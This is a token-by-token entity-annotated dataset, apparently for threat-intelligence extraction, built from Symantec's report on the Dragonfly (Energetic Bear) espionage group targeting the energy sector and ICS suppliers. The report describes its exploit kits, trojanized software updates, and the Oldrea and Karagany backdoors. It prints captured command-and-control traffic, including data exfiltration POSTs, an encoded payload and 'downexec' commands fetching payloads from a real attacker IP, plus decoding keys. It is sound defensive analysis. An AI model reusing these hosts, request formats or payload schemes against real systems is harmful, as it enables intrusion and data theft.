A O
cyberespionage O
campaign O
against O
a O
range O
of O
targets O
, O
mainly O
in O
the O
energy O
sector O
, O
gave O
attackers O
the O
ability O
to O
mount O
sabotage O
operations O
against O
their O
victims O
. O
 
The O
attackers O
, O
known O
to O
Symantec O
as O
Dragonfly O
, O
managed O
to O
compromise O
a O
number O
of O
strategically O
important O
organizations O
for O
spying O
purposes O
and O
, O
if O
they O
had O
used O
the O
sabotage O
capabilities O
open O
to O
them O
, O
could O
have O
caused O
damage O
or O
disruption O
to O
the O
energy O
supply O
in O
the O
affected O
countries O
. O
 
The O
Dragonfly O
group O
, O
which O
is O
also O
known O
by O
other O
vendors O
as O
Energetic O
Bear O
, O
are O
a O
capable O
group O
who O
are O
evolving O
over O
time O
and O
targeting O
primarily O
the O
energy O
sector O
and O
related O
industries O
. O
 
They O
have O
been O
in O
operation O
since O
at O
least O
2011 O
but O
may O
have O
been O
active O
even O
longer O
than O
that O
. O
 
Dragonfly O
initially O
targeted O
defense O
and O
aviation O
companies O
in O
the O
US O
and O
Canada O
before O
shifting O
its O
focus O
to O
US O
and O
European O
energy O
firms O
in O
early O
2013 O
. O
 
More O
recent O
targets O
have O
included O
companies O
related O
to O
industrial O
control O
systems O
. O
 
Dragonfly O
has O
used O
spam O
email O
campaigns O
and O
watering O
hole O
attacks O
to O
infect O
targeted O
organizations O
. O
 
The O
group O
has O
used O
two O
main O
malware O
tools O
: O
Trojan O
. O
Karagany O
and O
Backdoor O
. O
Oldrea O
. O
 
The O
latter O
appears O
to O
be O
a O
custom O
piece O
of O
malware O
, O
either O
written O
by O
or O
for O
the O
attackers O
. O
 
Symantec O
observed O
spear O
phishing O
attempts O
in O
the O
form O
of O
emails O
with O
PDF O
attachments O
from O
February O
2013 O
to O
June O
2013 O
. O
 
The O
email O
topics O
were O
related O
to O
office O
administration O
issues O
such O
as O
dealing O
with O
an O
account O
or O
problems O
with O
a O
delivery O
. O
 
Identified O
targets O
of O
this O
campaign O
were O
mainly O
US O
and O
UK O
organizations O
within O
the O
energy O
sector O
. O
 
In O
May O
2013 O
, O
the O
attackers O
began O
to O
use O
the O
Lightsout O
exploit O
kit O
as O
an O
attack O
vector O
, O
redirecting O
targets O
from O
various O
websites O
. O
 
The O
use O
of O
the O
Lightsout O
exploit O
kit O
has O
continued O
to O
date O
, O
albeit O
intermittently O
. O
 
The O
exploit O
kit O
has O
been O
upgraded O
over O
time O
with O
obfuscation O
techniques O
. O
 
The O
updated O
version O
of O
Lightsout O
became O
known O
as O
the O
Hello O
exploit O
kit O
. O
 
A O
newer O
approach O
used O
by O
the B-Entity
attackers I-Entity
involves O
compromising B-Action
the O
update B-Entity
site I-Entity
for I-Entity
several I-Entity
industrial I-Entity
control I-Entity
system I-Entity
( I-Entity
ICS I-Entity
) I-Entity
software I-Entity
producers I-Entity
. O
 
They B-Entity
then O
bundle B-Action
Backdoor O
. B-Entity
Oldrea I-Entity
with B-Modifier
a O
legitimate B-Entity
update I-Entity
of I-Entity
the I-Entity
affected I-Entity
software I-Entity
. O
 
To O
date O
, O
three O
ICS O
software O
producers O
are O
known O
to O
have O
been O
compromised O
. O
 
The O
Dragonfly B-Entity
attackers I-Entity
used B-Action
hacked O
websites B-Entity
to B-Modifier
host O
command B-Entity
- I-Entity
and I-Entity
- I-Entity
control I-Entity
( I-Entity
C&C I-Entity
) I-Entity
software I-Entity
. O
 
Compromised O
websites O
appear O
to O
consistently O
use O
some O
form O
of O
content O
management O
system O
. O
 
The O
current O
targets O
of O
the O
Dragonfly O
group O
, O
based O
on O
compromised O
websites O
and O
hijacked O
software O
updates O
, O
are O
the O
energy O
sector O
and O
industrial O
control O
systems O
, O
particularly O
those O
based O
in O
Europe O
. O
 
While O
the O
majority O
of O
victims O
are O
located O
in O
the O
US O
, O
these O
appear O
to O
mostly O
be O
collateral O
damage O
. O
 
That O
is O
, O
many O
of O
these O
computers O
were O
likely O
infected O
either O
through O
watering O
hole O
attacks O
or O
update O
hijacks O
and O
are O
of O
no O
interest O
to O
the O
attacker O
. O
 
By O
examining O
victims O
with O
active O
infections O
– O
where O
additional O
malicious O
activity O
has O
been O
detected O
– O
it O
is O
possible O
to O
gather O
a O
more O
accurate O
picture O
of O
' O
true O
' O
victims O
. O
 
The O
most O
active O
infections O
, O
as O
in O
Figure O
2 O
, O
are O
in O
Spain O
, O
followed O
in O
order O
by O
the O
US O
, O
France O
, O
Italy O
, O
and O
Germany O
. O
 
Dragonfly O
uses O
two O
main O
pieces O
of O
malware O
in O
its O
attacks O
. O
 
Both O
are O
Remote B-Entity
Access I-Entity
Tool I-Entity
( I-Entity
RAT I-Entity
) I-Entity
type I-Entity
malware I-Entity
which O
provide B-Action
the O
attackers B-Entity
with B-Modifier
access O
and B-Entity
control I-Entity
of I-Entity
compromised I-Entity
computers I-Entity
. O
 
Dragonfly O
's O
favored O
malware O
tool O
is O
Backdoor O
. O
Oldrea O
, O
which O
is O
also O
known O
as O
Havex O
or O
the O
Energetic O
Bear O
RAT O
. O
 
Oldrea O
acts O
as O
a O
back O
door O
for O
the O
attackers O
on O
to O
the O
victim O
's O
computer O
, O
allowing O
them O
to O
extract B-Action
data B-Entity
and O
install B-Action
further O
malware B-Entity
. O
 
Oldrea O
appears O
to O
be O
custom O
malware O
, O
either O
written O
by O
the O
group O
itself O
or O
created O
for O
it O
. O
 
This O
provides O
some O
indication O
of O
the O
capabilities O
and O
resources O
behind O
the O
Dragonfly O
group O
. O
 
The O
second O
main O
tool O
used O
by O
Dragonfly O
is O
Trojan O
. O
Karagany O
. O
 
Unlike O
Oldrea O
, O
Karagany O
was O
available O
on O
the O
underground O
market O
. O
 
The O
source O
code O
for O
version O
1 O
of O
Karagany O
was O
leaked O
in O
2010 O
. O
 
Symantec O
believes O
that O
Dragonfly O
may O
have O
taken O
this O
source O
code O
and O
modified O
for O
its O
own O
use O
. O
 
Symantec O
found O
that O
the O
majority O
of O
computers O
compromised O
by O
the O
attackers O
were O
infected O
with O
Oldrea O
. O
 
Karagany O
was O
only O
used O
in O
around O
5 O
percent O
of O
infections O
. O
 
The O
two O
pieces O
of O
malware O
are O
similar O
in O
functionality O
and O
what O
prompts O
the O
attackers O
to O
choose O
one O
tool O
over O
another O
remains O
unknown O
. O
 
The O
Dragonfly O
group O
has O
used O
at O
least O
three O
infection O
tactics O
against O
targets O
in O
the O
energy O
sector O
. O
 
The O
earliest O
method O
was O
an O
email O
spear O
phishing O
campaign O
, O
which O
saw O
selected B-Entity
executives I-Entity
and I-Entity
senior I-Entity
employees I-Entity
in I-Entity
target I-Entity
companies I-Entity
receive B-Action
emails O
containing B-Entity
a I-Entity
malicious I-Entity
PDF I-Entity
attachment I-Entity
. O
 
Infected O
emails O
had O
one O
of O
two O
subject O
lines O
: O
" O
The O
account O
" O
or O
" O
Settlement O
of O
delivery O
problem O
" O
. O
 
All O
of O
the O
emails O
were O
from O
a O
single O
Gmail O
address O
. O
 
Figure O
3 O
displays O
the O
number O
of O
different O
recipients O
per O
day O
. O
 
The O
spam O
campaign O
began O
in O
February O
2013 O
and O
continued O
into O
June O
2013 O
. O
 
Symantec O
identified O
seven O
different O
organizations O
targeted O
in O
this O
campaign O
. O
 
At O
least O
one O
organization O
was O
attacked O
intermittently O
for O
a O
period O
of O
84 O
days O
. O
 
In O
June O
2013 O
, O
the O
attackers O
shifted O
their O
focus O
to O
watering O
hole O
attacks O
. O
 
They O
compromised O
a O
number O
of O
energy- O
related O
websites O
and O
injected O
an O
iframe O
into O
each O
of O
them O
. O
 
This O
iframe O
then O
redirected O
visitors O
to O
another O
compromised O
legitimate O
website O
hosting O
the O
Lightsout O
exploit O
kit O
. O
 
This O
in O
turn O
exploited O
either O
Java O
or O
Internet O
Explorer O
in O
order O
to O
drop B-Action
Oldrea O
or B-Entity
Karagany I-Entity
on B-Modifier
the O
victim B-Entity
's I-Entity
computer I-Entity
. O
 
The O
fact O
that O
the O
attackers O
compromised O
multiple O
legitimate O
websites O
for O
each O
stage O
of O
the O
operation O
is O
further O
evidence O
that O
the O
group O
has O
strong O
technical O
capabilities O
. O
 
In O
September O
2013 O
, O
Dragonfly O
began O
using O
a O
new O
version O
of O
this O
exploit O
kit O
, O
known O
as O
the O
Hello O
exploit O
kit O
. O
 
The O
landing O
page O
for O
this O
kit O
contains O
JavaScript O
which O
fingerprints O
the O
system O
, O
identifying O
installed O
browser O
plugins O
. O
 
The O
victim O
is O
then O
redirected O
to O
a O
URL O
which O
in O
turn O
determines O
the O
best O
exploit O
to O
use O
based O
on O
the O
information O
collected O
. O
 
Figure O
4 O
shows O
the O
compromised O
websites O
categorized O
into O
their O
respective O
industries O
. O
 
Fifty O
percent O
of O
identified O
targets O
were O
energy O
industry O
related O
and O
thirty O
percent O
were O
energy O
control O
systems O
, O
as O
shown O
in O
Figure O
4 O
. O
 
A O
clear O
shift O
in O
the O
attackers O
targeting O
can O
be O
seen O
in O
March O
2014 O
when O
energy O
control O
systems O
become O
the O
primary O
target O
. O
 
The O
most O
ambitious O
attack O
vector O
used O
by O
Dragonfly O
was O
the O
compromise O
of O
a O
number O
of O
legitimate O
software O
packages O
. O
 
Three O
different O
ICS O
equipment O
providers O
were O
targeted O
and O
malware O
was O
inserted O
into O
the O
software O
bundles O
they O
had O
made O
available O
for O
download O
on O
their O
websites O
. O
 
Analysis O
of O
the O
compilation O
timestamps O
on O
the O
malware O
used O
by O
the O
attackers O
indicate O
that O
the O
group O
mostly O
worked O
between O
Monday O
and O
Friday O
, O
with O
activity O
mainly O
concentrated O
in O
a O
nine O
- O
hour O
period O
that O
corresponded O
to O
a O
9 O
am O
to O
6 O
pm O
working O
day O
in O
the O
UTC O
+ O
4 O
time O
zone O
. O
 
The O
Dragonfly O
group O
is O
technically O
adept O
and O
able O
to O
think O
strategically O
. O
 
Given O
the O
size O
of O
some O
of O
its O
targets O
, O
the O
group O
found O
a O
" O
soft O
underbelly O
" O
by O
compromising O
their O
suppliers O
, O
which O
are O
invariably O
smaller O
, O
less O
protected O
companies O
. O
 
Identification O
of O
this O
group O
is O
based O
on O
the O
use O
of O
two O
malware O
families O
and O
an O
exploit O
kit O
. O
 
The O
malware O
families O
utilized O
are O
Backdoor O
. O
Oldrea O
and O
Trojan O
. O
Karagany O
. O
 
The O
exploit O
kit O
is O
known O
as O
Lightsout O
and/or O
Hello O
. O
 
Hello O
is O
an O
updated O
iteration O
of O
Lightsout O
that O
the O
Dragonfly O
group O
began O
to O
use O
in O
September O
2013 O
. O
 
Use O
of O
Backdoor O
. O
Oldrea O
appears O
to O
be O
limited O
to O
the O
Dragonfly O
group O
. O
 
In O
addition O
, O
specific O
instances O
of O
Trojan O
. O
 
Karagany O
have O
been O
used O
by O
this O
group O
. O
 
Karagany O
is O
a O
Russian O
RAT O
sold O
on O
underground O
forums O
. O
 
Instances O
of O
this O
malware O
related O
to O
the O
Dragonfly O
group O
are O
identified O
based O
on O
them O
being O
delivered O
through O
the O
Lightsout O
exploit O
kit O
and O
also O
a O
particular O
packer O
that O
this O
group O
used O
. O
 
Symantec O
detects O
the O
Trojan O
. O
Karagany O
packer O
used O
by O
this O
group O
as O
Trojan O
. O
Karagany!gen1 O
. O
 
The O
Lightsout O
exploit O
kit O
is O
a O
simple O
exploit O
kit O
that O
is O
consistently O
used O
to O
deliver O
primarily O
Backdoor O
. O
Oldrea O
and O
, O
in O
several O
instances O
, O
Trojan O
. O
Karagany O
. O
 
A O
number O
of O
sites O
that O
use O
content O
management O
systems O
were O
exploited O
and O
an O
iframe O
was O
used O
in O
order O
to O
redirect O
visitors O
to O
sites O
hosting O
the O
Lightsout O
exploit O
kit O
. O
 
An O
example O
of O
an O
injected O
iframe O
can O
be O
seen O
in O
figure O
7 O
. O
 
The O
exploit O
kit O
uses O
browser O
( O
e.g. O
 
Internet O
Explorer O
and O
Firefox O
) O
and O
Java O
exploits O
in O
order O
to O
deliver O
either O
Backdoor O
. O
Oldrea O
or O
Trojan O
. O
Karagany O
. O
 
An O
example O
of O
the O
structure O
of O
the O
Lightsout O
exploit O
kit O
can O
be O
seen O
Table O
1 O
. O
 
Note O
that O
file O
names O
and O
exploits O
used O
may O
vary O
. O
 
In O
September O
2013 O
, O
the O
Dragonfly O
group O
began O
using O
a O
new O
version O
of O
Lightsout O
, O
also O
known O
as O
the O
Hello O
exploit O
kit O
. O
 
The O
JavaScript O
included O
in O
the O
landing O
page O
redirects O
the O
browser O
to O
a O
URL O
that O
depends O
on O
the O
fonts O
installed O
on O
the O
system O
, O
browser O
add O
- O
ons O
, O
the O
OS O
version O
, O
and O
the O
user O
agent O
. O
 
At O
this O
point O
, O
it O
determines O
the O
best O
exploit O
to O
use O
, O
based O
on O
the O
information O
provided O
, O
and O
generates O
an O
appropriate O
URL O
to O
redirect O
the O
user O
to O
the O
appropriate O
exploit O
/ O
payload O
. O
 
The O
following O
shows O
an O
example O
of O
such O
a O
request O
: O
[ O
http://]compromised.example O
/ O
wp O
- O
includes O
/ O
pomo/ O
dtsrc.php?a=[EK O
_ O
DETERMINED O
_ O
PARAMETER O
] O
[ O
EK_DETERMINED_PARAMETER O
] O
may O
be O
anything O
listed O
in O
Table O
2 O
. O
 
The O
parameters O
dwe O
and O
dwd O
relate O
to O
which O
payload O
is O
requested O
for O
download O
, O
for O
example O
: O
The O
values O
of O
the O
[ O
EK_DETERMINED_PARAMETER O
] O
variable O
may O
relate O
to O
the O
two O
different O
file O
types O
represented O
by O
Backdoor O
. O
Oldrea O
and O
Trojan O
. O
 
Karagany!gen1 O
payloads O
. O
 
Oldrea O
payloads O
are O
DLL O
files O
( O
URLs O
end O
in O
" O
d O
" O
for O
DLL O
? O
) O
while O
Karagany!gen1 O
payloads O
are O
portable O
executables O
( O
URLs O
end O
in O
" O
e O
" O
for O
EXE O
? O
) O
. O
 
At O
the O
core O
of O
Backdoor O
. O
Oldrea O
is O
a B-Entity
persistent I-Entity
component I-Entity
that O
interacts B-Action
with B-Modifier
C&C O
servers B-Entity
to O
download B-Action
and O
execute B-Action
payloads B-Entity
. O
 
The O
components B-Entity
are O
downloaded B-Action
by O
reaching B-Action
out I-Action
to B-Modifier
the O
C&C B-Entity
server I-Entity
and O
performing B-Action
a O
GET B-Entity
request I-Entity
which O
returns O
an O
HTML O
page O
containing O
a O
base64 O
encoded O
string O
between O
two O
comments O
marked O
with O
the O
' O
havex O
' O
string O
. O
 
In O
this O
specific O
example O
, O
the O
' O
038 O
' O
in O
the O
file O
name O
indicates O
the O
major O
version O
number O
. O
 
Post O
infection O
, O
Backdoor B-Entity
. I-Entity
Oldrea I-Entity
will O
attempt O
to O
collect B-Action
system O
information B-Entity
such O
as B-Modifier
OS O
, B-Entity
user I-Entity
name I-Entity
, I-Entity
computer I-Entity
name I-Entity
, I-Entity
country I-Entity
, I-Entity
language I-Entity
, I-Entity
nation I-Entity
, I-Entity
Internet I-Entity
adapter I-Entity
configuration I-Entity
information I-Entity
, I-Entity
available I-Entity
drives I-Entity
, I-Entity
default I-Entity
browser I-Entity
, I-Entity
running I-Entity
processes I-Entity
, I-Entity
desktop I-Entity
file I-Entity
list I-Entity
, I-Entity
My I-Entity
Documents I-Entity
, I-Entity
Internet I-Entity
history I-Entity
, I-Entity
program I-Entity
files I-Entity
, I-Entity
and I-Entity
root I-Entity
of I-Entity
available I-Entity
drives I-Entity
. O
 
It O
also O
collects O
data O
from O
Outlook O
( O
address O
book O
) O
and O
ICS O
related O
software O
configuration O
files O
. O
 
This O
data B-Entity
is O
collected B-Action
and O
written B-Action
to B-Modifier
a O
temporary B-Entity
file I-Entity
in B-Modifier
an O
encrypted B-Entity
form I-Entity
before O
it B-Entity
is O
POST'ed B-Action
to B-Modifier
a O
remote B-Entity
C&C I-Entity
server I-Entity
. O
 
The O
following O
are O
examples O
of O
a O
POST O
request O
and O
a O
POST O
response O
. O
 
POST O
request O
example O
: O
POST O
/wp08/wp O
- O
includes O
/ O
dtcla.php?id=285745296322896178920098FD80 O
- O
20&v1=038&v2=17 O
0393861&q=5265882854508EFCF958F979E4 O
HTTP/1.1 O
User O
- O
Agent O
: O
Mozilla/5.0 O
( O
Windows O
; O
U O
; O
Windows O
NT O
6.1 O
; O
en O
- O
US O
) O
AppleWebKit/525.19 O
( O
KHTML O
, O
like O
Gecko O
) O
Chrome/1.0.154.36 O
Safari/525.19 O
Host O
: O
toons.freesexycomics.com O
Content O
- O
Length O
: O
0 O
Cache O
- O
Control O
: O
no O
- O
cache O
POST O
response O
example O
: O
HTTP/1.1 O
200 O
OK O
Date O
: O
We O
d O
, O
22 O
Jan O
2014 O
13:40:48 O
GMT O
Content O
- O
Type O
: O
text O
/ O
html O
Transfer O
- O
Encoding O
: O
chunked O
Connection O
: O
keep O
- O
alive O
Server O
: O
Apache/1.3.37 O
( O
Unix O
) O
Cache O
- O
Control O
: O
no O
- O
cache O
9f65 O
< O
html><head><mega O
http O
- O
equiv='CACHE O
- O
CONTROL O
' O
content='NO O
- O
CACHE'></ O
head><body O
> O
No O
data!<!--havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// O
/////////4oB+93VVXu69DuN7XYzds9yt49Ques O
[ O
... O
TRUNCATED O
FOR O
READABILITY O
] O
+ O
yUW3zfTxWAOstsCwCckdW5 O
AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD O
M92D/8XckU4UJBmLwyNA==havex--></body></head O
> O
Various O
samples O
process O
the O
C&C O
responses O
differently O
. O
 
In O
one O
example O
, O
the O
sample O
searches O
for O
the O
data O
enclosed O
by O
the O
tag O
' O
havex O
' O
. O
 
Once O
the O
data O
is O
found O
, O
it O
is O
decoded O
using O
standard O
base64 O
+ O
bzip2 O
and O
also O
a O
xor O
layer O
with O
bytes O
from O
the O
string O
1312312 O
. O
 
The O
decoded O
data O
contains O
a O
small O
header O
followed O
by O
an O
executable O
MZ O
- O
file O
. O
 
Another O
sample O
was O
found O
to O
use O
standard O
base64 O
+ O
reverse O
xor O
+ O
RSA-2048 O
for O
decrypting O
received O
data O
. O
 
The O
decrypted O
data O
consists O
of O
a O
6 O
byte O
command O
concatenated O
with O
an O
MZ O
file O
. O
 
The O
MZ O
file O
is O
compressed O
with O
the O
lzma O
algorithm O
. O
 
RSA O
keys O
for O
decryption O
, O
together O
with O
other O
initial O
configuration O
information O
, O
are O
stored O
in O
the O
registry O
in O
base64 O
form O
. O
 
This O
section O
includes O
information O
about O
identified O
payloads O
downloaded O
by O
Backdoor O
. O
Oldrea O
. O
 
The O
following O
is O
a O
brief O
description O
of O
the O
functionality O
for O
each O
identified O
component O
. O
 
Trojan O
. O
Karagany O
is O
a O
back O
door O
used O
primarily O
for O
recon O
. O
 
It B-Entity
is O
designed O
to O
download B-Action
and O
install B-Action
additional O
files B-Entity
and O
exfiltrate B-Action
data B-Entity
. O
 
Samples O
sometimes O
use O
common O
binary O
packers O
such O
as O
UPX O
and O
Aspack O
on O
top O
of O
a O
custom O
Delphi O
binary O
packer O
/ O
protector O
for O
the O
payload O
. O
 
Where O
present O
in O
samples O
, O
the O
Delphi O
packer O
is O
configured O
to O
use O
' O
neosphere O
' O
as O
a O
key O
to O
decrypt O
the O
payload O
. O
 
The O
following O
is O
a O
brief O
overview O
of O
the O
functionality O
of O
Trojan O
. O
Karagany O
. O
 
Trojan O
. O
Karagany O
creates O
a O
folder O
in O
the O
user O
APPDATA O
directory O
and O
chooses O
the O
directory O
name O
from O
the O
following O
list O
. O
 
It O
copies O
itself O
in O
the O
created O
directory O
with O
hidden O
and O
system O
attributes O
using O
a O
file O
name O
chosen O
from O
the O
following O
list O
. O
 
Trojan O
. B-Entity
Karagany I-Entity
copies B-Action
itself B-Entity
with B-Modifier
hidden O
and B-Entity
system I-Entity
attributes I-Entity
where I-Entity
it I-Entity
was I-Entity
first I-Entity
executed I-Entity
as O
err.log[DIGITS O
] O
. O
 
It O
then O
copies O
the O
legitimate O
chkdsk O
utility O
in O
the O
installation O
folder O
using O
the O
payload O
file O
name O
but O
with O
a O
space O
before O
the O
file O
extension O
. O
 
This O
may O
fool O
ordinary O
users O
into O
thinking O
that O
this O
folder O
contains O
a O
legitimate O
application O
, O
for O
example O
PnPutil O
.exe O
. O
 
Trojan O
. O
Karagany!gen1 O
may O
create O
the O
following O
additional O
files O
in O
the O
installation O
folder O
. O
 
It O
then O
creates O
a O
C:\ProgramData\Mail\MailAg\gl O
directory O
as O
a O
temporary O
directory O
used O
for O
uploading O
files O
. O
 
Trojan O
. O
Karagany O
then O
creates O
a O
link O
to O
itself O
in O
the O
Startup O
folder O
as O
an O
autostart O
when O
the O
system O
restarts O
. O
 
Trojan O
. B-Entity
Karagany I-Entity
first O
checks B-Action
for B-Modifier
a O
live B-Entity
Internet I-Entity
connection I-Entity
by B-Modifier
visiting O
Microsoft B-Entity
or I-Entity
Adobe I-Entity
websites I-Entity
. O
 
It B-Entity
will O
only O
reach B-Action
out I-Action
to B-Modifier
its O
C&C B-Entity
server I-Entity
once O
this O
check O
is O
successful O
. O
 
Example O
HTTP O
Requests O
Internet O
connection O
test O
to O
Microsoft O
GET O
/en O
- O
us O
/ O
default.aspx O
HTTP/1.1 O
Accept O
- O
Encoding O
: O
gzip O
, O
deflate O
Content O
- O
Type O
: O
application O
/ O
x O
- O
www O
- O
form O
- O
urlencoded O
Host O
: O
microsoft.com O
Cookie O
: O
MC1=V=3&GUID=<32 O
character O
guid O
> O
Connection O
: O
Keep O
- O
Alive O
Cache O
- O
control O
: O
no O
- O
cache O
Internet O
connection O
test O
to O
Adobe O
using O
identifiant O
parameter O
POST O
/geo O
/ O
productid.php O
HTTP/1.1 O
Content O
- O
Type O
: O
application O
/ O
x O
- O
www O
- O
form O
- O
urlencoded O
Host O
: O
adobe.com O
... O
 
identifiant=51032 O
_ O
175129256364 O
Example O
POST O
request O
for O
C&C O
server O
check O
- O
in O
POST O
/check O
_ O
value.php O
HTTP/1.1 O
User O
- O
Agent O
: O
Mozilla/4.0 O
( O
compatible O
; O
MSIE O
7.0 O
; O
Windows O
NT O
6.1 O
; O
.NET O
CLR O
2.0.50727 O
) O
Host O
: O
93.188.161.235 O
... O
 
identifiant=51032 O
_ O
1799883375637&version O
= O
i2pver O
HTTP O
response O
example O
HTTP/1.1 O
200 O
OK O
Date O
: O
Tue O
, O
28 O
Jan O
2014 O
05:59:58 O
GMT O
Vary O
: O
Accept O
- O
Encoding O
Content O
- O
Length O
: O
324 O
Content O
- O
Type O
: O
text O
/ O
html O
X O
- O
Powered O
- O
By O
: O
PHP/5.3.10 O
- O
1ubuntu3.9 O
Via O
: O
1.1 O
host.alexsieff.com O
work:3|downexec O
[ O
http://]93.188.161.235/check2/muees27jxt O
/ O
shot.jpg O
; O
work:5|downexec O
[ O
http://]93.188.161.235/check2/muees27jxt O
/ O
tl.jpg O
; O
work:7|downexec O
[ O
http://]93.188.161.235/check2/muees27jxt O
/ O
fl.jpg O
; O
work:103|downexec O
[ O
http://]93.188.161.235/check2/muees27jxt O
/ O
pdump.jpg O
; O
work:118|downexec O
[ O
http://]93.188.161.235/check2/muees27jxt O
/ O
fl.jpg O
; O
The O
POST O
data O
contains O
the O
operating O
system O
version O
and O
a O
derived O
number O
. O
 
User O
- O
Agent O
tokens O
used O
in O
C&C O
requests O
are O
hard O
- O
coded O
. O
 
The O
following O
two O
examples O
have O
been O
observed O
. O
 
Regular O
expression O
for O
URL O
or O
HTTP O
request O
- O
line O
searches O
. O
 
Regular O
expression O
for O
file O
system O
searches O
. O
 
Karagany O
Yara O
rule O
: O
Symantec O
Security O
Response O
﻿﻿ O
Symantec O
protects O
the O
world O
's O
information O
and O
is O
the O
global O
leader O
in O
security O
, O
backup O
, O
and O
availability O
solutions O
. O
 
Our O
innovative O
products O
and O
services O
protect O
people O
and O
information O
in O
any O
environment O
- O
from O
the O
smallest O
mobile O
device O
to O
the O
enterprise O
data O
center O
to O
cloud O
- O
based O
systems O
. O
 
Our O
industry O
- O
leading O
expertise O
in O
protecting O
data O
, O
identities O
, O
and O
interactions O
gives O
our O
customers O
confidence O
in O
a O
connected O
world O
. O
 
More O
information O
is O
available O
at O
www.symantec.com O
or O
by O
connecting O
with O
Symantec O
at O
go.symantec.com/socialmedia O
. O
 
Headquartered O
in O
Mountain O
View O
, O
Calif. O
, O
Symantec O
has O
operations O
in O
40 O
countries O
. O
 
More O
information O
is O
available O
at O
www.symantec.com O
. O
 
For O
specific O
country O
offices O
and O
contact O
numbers O
, O
please O
visit O
our O
website O
. O
 
Symantec O
World O
Headquarters O
350 O
Ellis O
St. O
 
Mountain O
View O
, O
CA O
94043 O
USA O
+ O
1 O
( O
650 O
) O
527 O
- O
8000 O
1 O
( O
800 O
) O
721 O
- O
3934 O
www.symantec.com O
Copyright O
2014 O
Symantec O
Corporation O
. O
 
All O
rights O
reserved O
. O
 
Symantec O
, O
the O
Symantec O
Logo O
, O
and O
the O
Checkmark O
Logo O
are O
trademarks O
or O
registered O
trademarks O
of O
Symantec O
Corporation O
or O
its O
affiliates O
in O
the O
U.S. O
 
and O
other O
countries O
. O
 
Other O
names O
may O
be O
trademarks O
of O
their O
respective O
owners O
. O
 
Any O
technical O
information O
that O
is O
made O
available O
by O
Symantec O
Corporation O
is O
the O
copyrighted O
work O
of O
Symantec O
Corporation O
and O
is O
owned O
by O
Symantec O
Corporation O
. O
 
NO O
WARRANTY O
. O
 
The O
technical O
information O
is O
being O
delivered O
to O
you O
as O
is O
and O
Symantec O
Corporation O
makes O
no O
warranty O
as O
to O
its O
accuracy O
or O
use O
. O
 
Any O
use O
of O
the O
technical O
documentation O
or O
the O
information O
contained O
herein O
is O
at O
the O
risk O
of O
the O
user O
. O
 
Documentation O
may O
include O
technical O
or O
other O
inaccuracies O
or O
typographical O
errors O
. O
 
Symantec O
reserves O
the O
right O
to O
make O
changes O
without O
prior O
notice O
. O
 
